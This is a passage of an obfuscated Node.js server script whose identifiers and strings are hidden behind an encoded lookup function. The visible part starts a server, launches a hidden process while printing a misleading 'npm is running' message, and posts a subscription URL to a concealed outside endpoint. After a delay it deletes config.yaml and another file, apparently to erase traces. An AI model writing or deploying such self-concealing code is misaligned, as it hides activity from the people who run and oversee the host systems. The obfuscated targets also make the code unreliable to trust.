console[_0x2947e6(_0x4d969a._0x45a11d)]('npm\x20is\x20running');});}catch(_0x530462){console[_0x4536d2(_0x57dfd4._0x16e2cd)](_0x4536d2(_0x57dfd4._0x1f5290)+_0x530462);}};async function addAccessTask(){const _0x1695d1={_0xba8db4:0x1cb,_0x3f43db:0x183,_0x1ffb69:0x1e2},_0x1edd9f=_0x41b37e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x50f8bc='https://'+DOMAIN+'/'+SUB_PATH;try{const _0xc173b2=await axios[_0x1edd9f(0x1dd)](_0x1edd9f(_0x1695d1._0xba8db4),{'url':_0x50f8bc},{'headers':{'Content-Type':_0x1edd9f(_0x1695d1._0x3f43db)}});console[_0x1edd9f(_0x1695d1._0x1ffb69)](_0x1edd9f(0x1ee));}catch(_0x4dbed2){}}const delFiles=()=>{const _0x4c8c45={_0x470913:0x186,_0x3482f0:0x174},_0x3c0b22=_0x41b37e;[_0x3c0b22(_0x4c8c45._0x470913),'config.yaml'][_0x3c0b22(_0x4c8c45._0x3482f0)](_0x1ce8ac=>fs[_0x3c0b22(0x192)](_0x1ce8ac,()=>{}));};httpServer[_0x41b37e(0x1b4)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
